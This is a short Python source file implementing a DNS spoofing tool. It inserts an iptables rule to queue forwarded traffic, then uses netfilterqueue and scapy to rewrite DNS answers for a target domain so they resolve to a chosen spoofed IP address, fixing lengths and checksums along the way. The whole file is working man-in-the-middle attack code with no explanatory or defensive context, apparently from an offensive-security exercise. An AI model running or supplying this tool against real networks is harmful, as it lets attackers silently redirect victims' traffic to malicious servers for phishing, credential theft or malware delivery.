import netfilterqueue
import subprocess
import scapy.all as scapy


class DNS_spoofing:
    def __init__(self, target_address, spoofed_address):
        self.target_address = target_address
        self.spoofed_address = spoofed_address
        self.queue = netfilterqueue.NetfilterQueue()
        self.queue.bind(0, self.process_packet)

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            print("\r"+scapy_packet.summary(), end="")
            qname = scapy_packet[scapy.DNSQR].qname
            if self.target_address in str(qname):
                answer = scapy.DNSRR(rrname=qname, rdata=self.spoofed_address)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                packet.set_payload(bytes(scapy_packet))
        packet.accept()

    def run(self):
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        self.queue.run()
